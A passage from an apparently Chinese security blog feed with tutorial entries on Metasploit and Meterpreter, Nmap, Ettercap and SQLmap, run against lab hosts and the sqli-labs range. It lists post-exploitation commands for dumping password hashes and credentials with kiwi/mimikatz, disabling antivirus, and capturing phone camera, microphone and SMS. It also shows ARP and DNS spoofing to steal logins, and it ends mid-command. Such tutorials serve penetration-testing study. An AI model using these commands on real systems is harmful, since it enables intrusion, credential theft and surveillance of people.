(目前只适用于Windows)</td></tr><tr><td>Meterpreter</td><td>后续利用模块</td><td>作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。通常也作为后渗透测试功能使用。</td></tr></tbody></table></figure><br><!-- /wp:table --></p><h4 id="1-Auxiliaries"><a href="#1-Auxiliaries" class="headerlink" title="(1) Auxiliaries"></a>(1) Auxiliaries</h4><p>这个模块是来辅助渗透的，比如端口扫描啊，漏洞验证啊，登录密码爆破啊等等这些东西</p><p>我们在MSF中看一下，命令行输入<code>msfconsole</code>打开MSF，然后通过<code>search</code>来找到和Auxiliaries相关的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search auxiliary</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\MSF渗透测试框架介绍11.webp" alt=""></p><p>可以看到有这么多东西。</p><h4 id="2-Exploit"><a href="#2-Exploit" class="headerlink" title="(2) Exploit"></a>(2) Exploit</h4><p>Exploit模块，这是一个漏洞利用模块，包含主流的漏洞利用脚本，通常是对默写可能存在漏洞的目标进行漏洞利用</p><p><img src="\media\2023\02\MSF渗透测试框架介绍12.webp" alt=""></p><h4 id="3-其他的自行查看就行了。"><a href="#3-其他的自行查看就行了。" class="headerlink" title="(3) 其他的自行查看就行了。"></a>(3) 其他的自行查看就行了。</h4><p>剩下的自己看看就行了，这里就不作过多的介绍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Meterpreter相关介绍</title>
      <link href="/2023/02/16/8/"/>
      <url>/2023/02/16/8/</url>
      
        <content type="html"><![CDATA[<h2 id="一-Meterpreter是什么"><a href="#一-Meterpreter是什么" class="headerlink" title="一. Meterpreter是什么"></a>一. Meterpreter是什么</h2><p>当我们利用MSF生成了一个木马，并且在靶机上运行后，我们的MSF会进入如下的一个界面</p><p><img src="\media\2023\02\Meterpreter相关介绍1.webp" alt=""></p><p>我们进入一个meterpreter的命令行。</p><p>我们建立了一个木马链接，这在MSF中叫做一个session，第一个建立的连接就是 session 1；如果你又建立了一个连接或者漏洞利用进程，它就是session 2.</p><p>Meterpreter是Metasploit框架中的一个利器，作为漏洞溢出后的攻击载荷使用。</p><p>攻击荷在触发漏洞后会返回-个由我们控制的通道，可用于远程执行命令!</p><p>Metasploit提供了各个主流平台的Meterpreter版本，包括Windows、Linux，同时支持x86、x64平台，另外，Meterpreter还提供了基于PHP和Java语言的实现。</p><p>Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</p><p>除上述外，Meterpreter还支持Ruby脚本形式的扩展。所以Ruby语言还很有必要了解下。</p><h2 id="二-Meterpreter中常用的反弹类型"><a href="#二-Meterpreter中常用的反弹类型" class="headerlink" title="二. Meterpreter中常用的反弹类型"></a>二. Meterpreter中常用的反弹类型</h2><ol><li>reverse tcp</li></ol><p>这是一个基于TCP的反向接反shell,使用起来很稳定</p><ol><li>web_delivery</li></ol><p>web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell。</p><p>还有其他的，但是我没用过……</p><h2 id="三-Meterpreter常用命令"><a href="#三-Meterpreter常用命令" class="headerlink" title="三. Meterpreter常用命令"></a>三. Meterpreter常用命令</h2><h3 id="1-常用参数"><a href="#1-常用参数" class="headerlink" title="1. 常用参数"></a>1. 常用参数</h3><p>我们可以通过<code>help</code>来查看常用命令</p><p><img src="\media\2023\02\Meterpreter相关介绍2-1024x775.webp" alt=""></p><h3 id="2-常用参数演示"><a href="#2-常用参数演示" class="headerlink" title="2. 常用参数演示"></a>2. 常用参数演示</h3><p>这里就演示几个，其他的自己手动研究研究</p><p><strong>1. backgroud</strong></p><p>我们输入<code>backgroud</code>可以将当前session切到后台</p><p><img src="\media\2023\02\Meterpreter相关介绍3.webp" alt=""></p><p>这样当前的 session 1 就切到后台了</p><ol><li>sessions</li></ol><p>我们如果在模块命令中，我们可以输入<code>sessions</code>可以查看当前session</p><p><img src="\media\2023\02\Meterpreter相关介绍4-1024x174.webp" alt=""></p><p>我们可以通过<code>sessions -i id</code>来选择一个session来进入</p><p><img src="\media\2023\02\Meterpreter相关介绍5.webp" alt=""></p><p>这样就进到了session 1</p><ol><li>bglist</li></ol><p>bglist可以查看当前运行的session</p><p><img src="\media\2023\02\Meterpreter相关介绍8.webp" alt=""></p><p>当前没有运行的session</p><ol><li>bgkill</li></ol><p>我们先看sessions有几个任务</p><p>有这几个任务</p><p><img src="\media\2023\02\Meterpreter相关介绍6-1024x189.webp" alt=""></p><p>我们现在想要杀死ID为2的session</p><p>我们进入sessions 2，然后输入 bgkill 2</p><p><img src="\media\2023\02\Meterpreter相关介绍7.webp" alt=""></p><p>啊，这两个session没运行……</p><h3 id="3-针对性常用命令"><a href="#3-针对性常用命令" class="headerlink" title="3. 针对性常用命令"></a>3. 针对性常用命令</h3><h4 id="1-针对安卓的一些命令"><a href="#1-针对安卓的一些命令" class="headerlink" title="(1) 针对安卓的一些命令"></a>(1) 针对安卓的一些命令</h4><p>当我们能够进入安卓手机的meterpreter后，我们可以输入一些命令来获取手机的一些信息</p><ul><li>获取手机通讯录： dump_contacts</li><li>获取手机短信记录： dump_sms</li><li>控制手机发短信： send_sms -d 15330252525 -t “hello” //控制手机向15330252525发出hello</li><li>获取手机GPS定位信息： geolocate</li><li>获取手机Wi-Fi定位信息： wlan_geolocate</li><li>控制手机录音： record_mic -d  5</li><li>获取手机相机设备： webcam_list</li><li>控制手机拍照 ： webcam_snap</li><li>直播手机摄像头： webcam_stream</li></ul><h4 id="2-针对Windows的一些命令"><a href="#2-针对Windows的一些命令" class="headerlink" title="(2) 针对Windows的一些命令"></a>(2) 针对Windows的一些命令</h4><ul><li>查看进程：ps</li><li>查看当前进程号：getpid</li><li>查看系统信息：sysinfo</li><li>查看目标机是否为虚拟机：run post/windows/gather/checkvm</li><li>查看完整网络设置：route</li><li>查看当前权限：getuid</li><li>自动提权：getsystem</li><li>关闭杀毒软件：run post/windows/manage/killav</li><li>启动远程桌面协议：run post/windows/manage/enable_rdp</li><li>列举当前登录的用户：run post/windows/gather/enum_logged_on_users</li><li>查看当前应用程序：run post/windows/gather/enum_applications</li><li>抓取目标机的屏幕截图：load espia；screengrab</li><li>获取相机设备：webcam_list</li><li>控制拍照 ：webcam_snap</li><li>直播摄像头：webcam_stream</li><li>控制录音：record_mic</li><li>查看当前处于目标机的那个目录：pwd</li><li>查看当前目录：getlwd</li><li>导出当前用户密码哈希：run hashdump<br>用户名：SID：LM哈希：NTLM哈希:::<br>也可以使用下面这个命令导出，权限更高：run windows/gather/smart_hashdump</li><li>抓取自动登录的用户名和密码：run windows/gather/credentials/windows_autologin</li><li>直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入getsystem）</li><li>首选终端输入  load kiwi    加载kiwi</li><li>creds_all：列举所有凭据</li><li>creds_kerberos：列举所有kerberos凭据</li><li>creds_msv：列举所有msv凭据</li><li>creds_ssp：列举所有ssp凭据</li><li>creds_tspkg：列举所有tspkg凭据</li><li>creds_wdigest：列举所有wdigest凭据</li><li>dcsync：通过DCSync检索用户帐户信息</li><li>dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</li><li>golden_ticket_create：创建黄金票据</li><li>kerberos_ticket_list：列举kerberos票据</li><li>kerberos_ticket_purge：清除kerberos票据</li><li>kerberos_ticket_use：使用kerberos票据</li><li>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</li><li>lsa_dump_sam：dump出lsa的SAM</li><li>lsa_dump_secrets：dump出lsa的密文</li><li>password_change：修改密码</li><li>wifi_list：列出当前用户的wifi配置文件</li><li>wifi_list_shared：列出共享wifi配置文件/编码</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap扫描基础与进阶</title>
      <link href="/2023/02/16/10/"/>
      <url>/2023/02/16/10/</url>
      
        <content type="html"><![CDATA[<h2 id="一-基础功能"><a href="#一-基础功能" class="headerlink" title="一. 基础功能"></a>一. 基础功能</h2><h3 id="1-扫描IP地址"><a href="#1-扫描IP地址" class="headerlink" title="1. 扫描IP地址"></a>1. 扫描IP地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE -n 192.168.31.0/24</span><br><span class="line">nmap -sn -PE -n 192.168.31.1-255</span><br></pre></td></tr></table></figure><p>这俩是一样的。</p><p><code>-sn</code> 参数代表了ping扫描，即主机发现</p><p><code>-PE</code>代表只使用ICMP echo请求探测，不然在虚拟机中会出现全部存活的情况</p><p><code>-n</code>是禁用域名解析，避免浪费时间在域名解析上。</p><p>这个的意思是扫描 192.168.31.0 这个网段中存活（在线）的设备。</p><p><img src="\media\2023\01\Nmap扫描基础与进阶1.webp" alt=""></p><p>这里第一个 192.168.31.1 是我的网关，其他的是我的无线设备。</p><h3 id="2-扫描端口号"><a href="#2-扫描端口号" class="headerlink" title="2. 扫描端口号"></a>2. 扫描端口号</h3><p>基于SYN包扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.211.184</span><br></pre></td></tr></table></figure><p>基于三次握手扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 192.168.211.184</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\Nmap扫描基础与进阶2.webp" alt=""></p><p>可以看到目标IP中，135，139，445这三个端口处于open状态。</p><h3 id="3-指定端口扫描"><a href="#3-指定端口扫描" class="headerlink" title="3. 指定端口扫描"></a>3. 指定端口扫描</h3><p>正常情况下，是不需要扫描所有端口的。我们可以指定端口来进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 10-200 192.168.31.114 // 扫描192.168.31.114的10到200之间的端口号</span><br><span class="line">nmap -p 21,22,25,80,445,3306,1521,8080,8888 192.168.31.114   // 扫描192.168.31.114指定的端口号</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\Nmap扫描基础与进阶3.webp" alt=""></p><p>这个IP是我用来测试的手机的IP地址，可以看到没扫出来。</p><h3 id="4-扫描端口和版本"><a href="#4-扫描端口和版本" class="headerlink" title="4. 扫描端口和版本"></a>4. 扫描端口和版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.211.184</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\Nmap扫描基础与进阶4.webp" alt=""></p><p>可以看到，它扫出了版本。</p><h3 id="5-扫描操作系统"><a href="#5-扫描操作系统" class="headerlink" title="5. 扫描操作系统"></a>5. 扫描操作系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.211.184</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\Nmap扫描基础与进阶5.webp" alt=""></p><h3 id="6-扫描全部"><a href="#6-扫描全部" class="headerlink" title="6. 扫描全部"></a>6. 扫描全部</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.211.184</span><br></pre></td></tr></table></figure><p>这个可以扫描出所有的信息。</p><p><img src="\media\2023\01\Nmap扫描基础与进阶6.webp" alt=""></p><h2 id="二-内置脚本扫描"><a href="#二-内置脚本扫描" class="headerlink" title="二. 内置脚本扫描"></a>二. 内置脚本扫描</h2><p>可以使用内置脚本进行功能扩展，命令语法为：<code>nmap --script=brute 192.168.112.188</code> 。</p><ul><li>auth：负责处理鉴权证书(绕开鉴权)的脚本</li><li>broadcast：在局域网内探查更多服务开启状况，如<code>dhcp / dns / sqlserver</code> 等服务</li><li>brute：提供暴力破解方式，针对常见的应用如<code>http / snmp</code>等</li><li>default：使用 <code>-sC</code>或 <code>-A</code> 选项扫描时候默认的脚本，提供基本脚本扫描能力</li><li>discovery：对网络进行更多的信息，如SMB枚举、SNMP查询等</li><li>dos：用于进行拒绝服务攻击</li><li>exploit：利用已知的漏洞入侵系统</li><li>external：利用第三方的数据库或资源，例如进行whois解析</li><li>fuzzer：模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</li><li>intrusive：入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</li><li>malware：探测目标机是否感染了病毒、开启了后门等信息</li><li>safe：此类与intrusive相反，属于安全性脚本</li><li>version：负责增强服务与版本扫描（Version Detection）功能的脚本</li><li>vuln：负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</li></ul><p>所有扫描脚本，可以查看Kali下的目录: <code>/usr/share/nmap/scripts</code>，具体各个脚本的用法及参数，参考: htps://nmap.org/nsedod</p><p><img src="\media\2023\01\Nmap扫描基础与进阶7.webp" alt=""></p><h2 id="三-脚本实战应用"><a href="#三-脚本实战应用" class="headerlink" title="三. 脚本实战应用"></a>三. 脚本实战应用</h2><h3 id="1-扫描SSH登录认证情况"><a href="#1-扫描SSH登录认证情况" class="headerlink" title="1. 扫描SSH登录认证情况"></a>1. 扫描SSH登录认证情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22 --script=auth 192.168.112.188</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\Nmap扫描基础与进阶8.webp" alt=""></p><p>可以看到这里有通过密码的方式来认证，意味着我们可以尝试爆破。</p><h3 id="2-指定字典波破"><a href="#2-指定字典波破" class="headerlink" title="2. 指定字典波破"></a>2. 指定字典波破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p3306 --script=brute --script-args &#x27;userdb=./usertest.txt,passdb=./password-500.txt&#x27; 192.168.112.188</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\Nmap扫描基础与进阶9.webp" alt=""></p><h3 id="3-扫描主机漏洞"><a href="#3-扫描主机漏洞" class="headerlink" title="3. 扫描主机漏洞"></a>3. 扫描主机漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln 192.168.112.158</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\Nmap扫描基础与进阶10.webp" alt=""></p><p>可以看到有一个远程代码执行漏洞，ms17-010，就是永恒之蓝</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ettercap使用教程(ARP,ICMP,DNS)</title>
      <link href="/2023/02/16/4/"/>
      <url>/2023/02/16/4/</url>
      
        <content type="html"><![CDATA[<h2 id="一-软件界面介绍"><a href="#一-软件界面介绍" class="headerlink" title="一. 软件界面介绍"></a>一. 软件界面介绍</h2><h3 id="1-进入软件时的设置"><a href="#1-进入软件时的设置" class="headerlink" title="1. 进入软件时的设置"></a>1. 进入软件时的设置</h3><p>在kali中内置了这个工具的图形化界面</p><p>我们打开这个工具</p><p><img src="\\media\2023\02\Ettercap使用教程1.webp" alt=""></p><p>我们设置好后点击上面的勾进入即可</p><h3 id="2-主要界面"><a href="#2-主要界面" class="headerlink" title="2. 主要界面"></a>2. 主要界面</h3><p><img src="\\media\2023\02\Ettercap使用教程2.webp" alt=""></p><p>我们点击搜索主机，然后点击主机列表</p><p><img src="\\media\2023\02\Ettercap使用教程3.webp" alt=""></p><p>当然你也可以右击列表中的主机进行操作</p><p><img src="\\media\2023\02\Ettercap使用教程4.webp" alt=""></p><h3 id="3-攻击设置界面"><a href="#3-攻击设置界面" class="headerlink" title="3. 攻击设置界面"></a>3. 攻击设置界面</h3><p>我们来看一下攻击模式中的内容</p><p><img src="\\media\2023\02\Ettercap使用教程5.webp" alt=""></p><h2 id="二-ARP欺骗与ARP攻击"><a href="#二-ARP欺骗与ARP攻击" class="headerlink" title="二. ARP欺骗与ARP攻击"></a>二. ARP欺骗与ARP攻击</h2><p>我们先扫主机，得到主机列表，然后将目标网关添加到目标1，目标IP添加到目标2</p><p><img src="\\media\2023\02\Ettercap使用教程6.webp" alt=""></p><h3 id="1-断网攻击"><a href="#1-断网攻击" class="headerlink" title="1. 断网攻击"></a>1. 断网攻击</h3><p>我们打开ARP攻击，停止扫描</p><p><img src="\\media\2023\02\Ettercap使用教程7.webp" alt=""></p><p>我们在被攻击的主机上访问一下外网</p><p><img src="\\media\2023\02\Ettercap使用教程8.webp" alt=""></p><p>可以看到，被攻击方在网络正常的情况下无法访问外网了。</p><h3 id="2-数据窃取-HTTP"><a href="#2-数据窃取-HTTP" class="headerlink" title="2. 数据窃取(HTTP)"></a>2. 数据窃取(HTTP)</h3><p>我们可以来获取http网站上输入的账号和密码。</p><p>打开ARP攻击，打开扫描</p><p>我们找到一个http的网站，比如7K7K.com</p><p>我登录输入一个随便的账号密码</p><p><img src="\\media\2023\02\Ettercap使用教程9.webp" alt=""></p><p>得到信息。</p><h3 id="3-数据窃取（HTTPS）"><a href="#3-数据窃取（HTTPS）" class="headerlink" title="3. 数据窃取（HTTPS）"></a>3. 数据窃取（HTTPS）</h3><p>窃取HTTPS目前已经不太现实，这里仅供参考。</p><p>想要获取https的话，我们需要另一个工具sslstrip，它可以把https降成http。</p><p>我们还需要启用Ettercap的脚本。</p><p>我们通过Vim来进行编辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br></pre></td></tr></table></figure><p><img src="\\media\2023\02\Ettercap使用教程10.webp" alt=""></p><p>把这个注释去掉</p><p><img src="\\media\2023\02\Ettercap使用教程12.webp" alt=""></p><p>然后保存</p><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure><p><img src="\\media\2023\02\Ettercap使用教程13.webp" alt=""></p><p>这样就可以实现https转换成http以获取帐号密码</p><p>我们来看看</p><p><img src="\\media\2023\02\Ettercap使用教程14.webp" alt=""></p><p>被防御了……</p><p>看看其他的网站</p><p><img src="\\media\2023\02\Ettercap使用教程15.webp" alt=""></p><p>能访问，但是显示异常。</p><h3 id="4-获取图片"><a href="#4-获取图片" class="headerlink" title="4. 获取图片"></a>4. 获取图片</h3><p>这里是用http网站，https已经失效了。</p><p>我们输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure><p><img src="\\media\2023\02\Ettercap使用教程16.webp" alt=""></p><p>我找个图片看看</p><p><img src="\\media\2023\02\Ettercap使用教程17.webp" alt=""></p><h2 id="三-DNS欺骗"><a href="#三-DNS欺骗" class="headerlink" title="三. DNS欺骗"></a>三. DNS欺骗</h2><p>我们输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*  A   192.168.40.129</span><br><span class="line">*  PTR 192.168.40.129</span><br></pre></td></tr></table></figure><p>这个是攻击方的IP。</p><p><img src="\\media\2023\02\Ettercap使用教程23.webp" alt=""></p><p>然后开启自带的 Apache 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 开启服务</span><br><span class="line">service apache2 start</span><br><span class="line"></span><br><span class="line"># 查询状态</span><br><span class="line">service apache2 status</span><br></pre></td></tr></table></figure><p><img src="\\media\2023\02\Ettercap使用教程19.webp" alt=""></p><p>我们找到这个路径下的html</p><p><img src="\\media\2023\02\Ettercap使用教程24.webp" alt=""></p><p>然后修改成自己的html</p><p><img src="\\media\2023\02\Ettercap使用教程25.webp" alt=""></p><p>然后我们正常的整ARP欺骗</p><p>整完后我们在插件那里找到这个</p><p><img src="\\media\2023\02\Ettercap使用教程20.webp" alt=""></p><p>双击加载</p><p><img src="\\media\2023\02\Ettercap使用教程21.webp" alt=""></p><p>当发生 DNS 欺骗后，靶机请求的数据都会在 ettercap 工具中展示出来</p><p><img src="\\media\2023\02\Ettercap使用教程22.webp" alt=""></p><p>看看对面</p><p><img src="\\media\2023\02\Ettercap使用教程26.webp" alt=""></p><p>不管它访问什么网站，都会显示咱们设置好的样式。</p><h2 id="二-ICMP攻击"><a href="#二-ICMP攻击" class="headerlink" title="二. ICMP攻击"></a>二. ICMP攻击</h2><p>这个工具的ICMP攻击和我们想的不太一样，也有可能是我用的不对，这工具在我手里变成了一个流量监控工具。</p><p>我们正常扫一下主机，列出主机列表</p><p>然后我们把目标网关加到目标1，目标IP加到目标2</p><p>然后攻击模式里选择ICMP</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS27.webp" alt=""></p><p>然后他会弹出一个弹窗</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS28.webp" alt=""></p><p>这里问你，想要把目标重定向哪里？</p><p>我们写上kali的MAC：00:50:56:28:13:28，KALI的IP：192.168.40.129</p><p>注意，是填写攻击方的MAC地址和IP</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS29.webp" alt=""></p><p>然后点击OK</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS30.webp" alt=""></p><p>出现这个就说明ICMP重定向已经开始了。这个图片有点问题，应该是GW 192.168.40.129</p><p>我们在kali上打开wireshark开始抓包，在目标机ping一下bilibili.com和baidu.com</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS31.webp" alt=""></p><p>bilibili的IP是：120.92.78.97；百度的IP是：110.242.68.66</p><p>看一下wireshark，先看一下120.92.78.97</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS33.webp" alt=""></p><p>可以看到，我们抓到了win7目标机ping哔哩哔哩的ICMP数据包。</p><p>我们在看看110.242.68.66</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS34.webp" alt=""></p><p>ping百度的也抓到了。</p><p>我们重新抓包，在win7上访问一下bilibili</p><p><img src="\\media\2023\02\Ettercap使用教程ARPICMPDNS35.webp" alt=""></p><p>也能抓到</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLmap过sql-libs靶场Page-1（1-22）</title>
      <link href="/2023/02/16/14/"/>
      <url>/2023/02/16/14/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Less-1"><a href="#1-Less-1" class="headerlink" title="1. Less-1"></a>1. Less-1</h2><h3 id="1-查看数据库"><a href="#1-查看数据库" class="headerlink" title="(1) 查看数据库"></a>(1) 查看数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-1/?id=1&quot; -dbs</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQLmap过sql-libs靶场Page-1（1-22）1.webp" alt=""></p><p>得到这几个数据库</p><h3 id="2-查看数据表"><a href="#2-查看数据表" class="headerlink" title="(2) 查看数据表"></a>(2) 查看数据表</h3><p>比如我们想看<code>security</code>这个数据库下有什么表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-1/?id=1&quot; -D security --tables </span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQLmap过sql-libs靶场Page-1（1-22）2.webp" alt=""></p><h3 id="3-查看表中字段"><a href="#3-查看表中字段" class="headerlink" title="(3) 查看表中字段"></a>(3) 查看表中字段</h3><p>我们看<code>users</code>表下的字段内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-1/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQLmap过sql-libs靶场Page-1（1-22）3.webp" alt=""></p><h3 id="4-查看字段值"><a href="#4-查看字段值" class="headerlink" title="(4) 查看字段值"></a>(4) 查看字段值</h3><p>查看<code>security</code>数据库下的<code>users</code>表里的<code>id</code>、<code>password</code>、<code>username</code>有哪些值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.3/sql-libs/Less-1/?id=1 -D security -T users --columns id,password,username --dump</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQLmap过sql-libs靶场Page-1（1-22）4.webp" alt=""></p><p>第一题结束</p><h2 id="2-Less-2"><a href="#2-Less-2" class="headerlink" title="2. Less-2"></a>2. Less-2</h2><p>和第一题一样。套代码就行了.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-2/?id=1&quot; -dbs</span><br><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-2/?id=1&quot; -D security --tables </span><br><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-2/?id=1&quot; -D security -T users --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-2/?id=1&quot; -D security -T users --columns id,password,username --dump</span><br></pre></td></tr></table></figure><h2 id="3-Less-3"><a href="#3-Less-3" class="headerlink" title="3. Less-3"></a>3. Less-3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-3/?id=1&quot; -dbs</span><br><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-3/?id=1&quot; -D security --tables </span><br><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-3/?id=1&quot; -D security -T users --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-2/?id=1&quot; -D security -T users --columns id,password,username --dump</span><br></pre></td></tr></table></figure><h2 id="4-Less-4"><a href="#4-Less-4" class="headerlink" title="4. Less-4"></a>4. Less-4</h2><p>一样……</p><h2 id="5-Less-5"><a href="#5-Less-5" class="headerlink" title="5. Less-5"></a>5. Less-5</h2><p>一样……</p><h2 id="6-Less-6"><a href="#6-Less-6" class="headerlink" title="6. Less-6"></a>6. Less-6</h2><p>一样……</p><h2 id="7-Less-7"><a href="#7-Less-7" class="headerlink" title="7. Less-7"></a>7. Less-7</h2><p>一样……</p><h2 id="8-Less-8"><a href="#8-Less-8" class="headerlink" title="8. Less-8"></a>8. Less-8</h2><p>一样……</p><h2 id="9-Less-9"><a href="#9-Less-9" class="headerlink" title="9. Less-9"></a>9. Less-9</h2><p>一样……</p><h2 id="10-Less-10"><a href="#10-Less-10" class="headerlink" title="10. Less-10"></a>10. Less-10</h2><p>出现了一些变化</p><p>套路不好使了，我们试试level2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-10/?id=1&quot; -level=2 -dbs</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQLmap过sql-libs靶场Page-1（1-22）5.webp" alt=""></p><p>后面就一样了，加上 <code>-level=2</code> 就行了。</p><h2 id="11-Less-11"><a href="#11-Less-11" class="headerlink" title="11. Less-11"></a>11. Less-11</h2><p>11题是一个登录界面，需要使用<code>--data</code>来定义payload的内容</p><p>先抓包找一下参数</p><p><img src="\media\2023\01\SQLmap过sql-libs靶场Page-1（1-22）6.webp" alt=""></p><p>有这三个参数</p><p>这道题不用加id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-11/&quot; --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQLmap过sql-libs靶场Page-1（1-22）7.webp" alt=""></p><p>剩下的简单了。</p><p>加上 <code>--data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot;</code>就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-11/&quot; --data 